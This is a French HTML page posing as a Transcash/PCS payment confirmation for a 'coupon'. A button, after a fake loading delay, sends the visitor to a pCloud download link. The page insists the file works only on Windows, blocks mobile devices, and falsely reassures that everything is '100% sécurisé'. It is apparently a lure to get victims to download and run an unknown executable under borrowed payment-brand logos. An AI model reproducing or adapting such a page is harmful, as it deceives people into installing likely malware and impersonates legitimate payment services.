<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Confirmation de Paiement - Coupon sécurisé</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f4f6f8;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
      text-align: center;
      max-width: 500px;
      width: 90%;
    }

    .logo-container img {
      height: 40px;
      margin: 0 10px;
      vertical-align: middle;
    }

    h1 {
      color: #c62828;
      font-size: 22px;
      margin-top: 20px;
    }

    p {
      color: #444;
      font-size: 15px;
      margin: 18px 0;
    }

    .note {
      font-size: 13px;
      color: #888;
      margin-top: 15px;
    }

    .download-btn {
      background-color: #d32f2f;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 20px;
    }

    .download-btn:hover {
      background-color: #b71c1c;
    }

    .loading {
      display: none;
      margin-top: 20px;
    }

    .loading span {
      display: inline-block;
      width: 8px;
      height: 8px;
      margin: 0 4px;
      background: #d32f2f;
      border-radius: 50%;
      animation: blink 1.4s infinite ease-in-out both;
    }

    .loading span:nth-child(2) { animation-delay: 0.2s; }
    .loading span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 80%, 100% { transform: scale(0); }
      40% { transform: scale(1); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Transcash-logo.png/320px-Transcash-logo.png" alt="Transcash">
      <img src="https://www.pcs-international.com/themes/custom/pcs/img/logo.svg" alt="PCS">
    </div>
    <h1>Confirmation de Paiement</h1>
    <p>Merci pour votre paiement ! Votre coupon est prêt à être téléchargé.</p>
    <p><strong>Compatible uniquement avec Windows.</strong></p>
    <p style="color: #2e7d32;">🔒 100% sécurisé – Vos données sont protégées.</p>

    <button class="download-btn" onclick="telecharger()">📥 Télécharger le fichier</button>

    <div class="loading" id="loadingAnimation">
      <p>Préparation du fichier <span></span><span></span><span></span></p>
    </div>

    <p class="note">Une connexion Internet est nécessaire. Aucune donnée bancaire ne sera enregistrée.</p>
  </div>

  <script>
    function telecharger() {
      document.getElementById('loadingAnimation').style.display = 'block';
      setTimeout(function() {
        window.location.href = "https://e.pcloud.link/publink/show?code=XZ8Ku6Z2TkxlwlYaH7m5fs1OOh9Iy3PME6X";
        document.getElementById('loadingAnimation').style.display = 'none';
      }, 3000);
    }
  </script>
<script>
  // Détection des appareils mobiles
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  if (isMobile) {
    // Cacher le bouton de téléchargement
    const downloadBtn = document.getElementById('downloadBtn');
    if (downloadBtn) downloadBtn.style.display = 'none';

    // Afficher un message d’avertissement
    const warning = document.createElement('p');
    warning.textContent = "⚠️ Le téléchargement n’est pas disponible sur mobile. Veuillez utiliser un ordinateur Windows.";
    warning.style.color = "red";
    warning.style.fontWeight = "bold";
    warning.style.textAlign = "center";

    document.body.appendChild(warning);
  }
</script>
</body>
</html>
